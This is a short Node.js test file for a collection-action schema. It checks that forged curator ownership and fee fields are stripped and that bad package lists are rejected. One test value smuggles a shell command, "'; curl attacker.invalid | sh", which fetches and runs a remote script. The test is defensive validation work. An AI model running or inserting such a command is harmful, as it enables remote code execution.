import test from "node:test";
import assert from "node:assert/strict";
import { CollectionAction } from "../src/lib/collections/contract.ts";
import { readFileSync } from "node:fs";
test("collection action rejects unsafe slugs and oversized bundles and strips forged ownership and fees", () => {
  const value = {
    action: "save",
    slug: "example-collection",
    title: "Example",
    description: "",
    is_public: false,
    packages: ["code-reviewer"],
    curator_user_id: "forged",
    curator_share_bps: 10000,
  };
  const result = CollectionAction.parse(value);
  assert.ok(!("curator_user_id" in result));
  assert.ok(!("curator_share_bps" in result));
  assert.equal(
    CollectionAction.safeParse({ ...value, packages: ["'; curl attacker.invalid | sh"] }).success,
    false,
  );
  assert.equal(
    CollectionAction.safeParse({ ...value, packages: Array(51).fill("code-reviewer") }).success,
    false,
  );
});
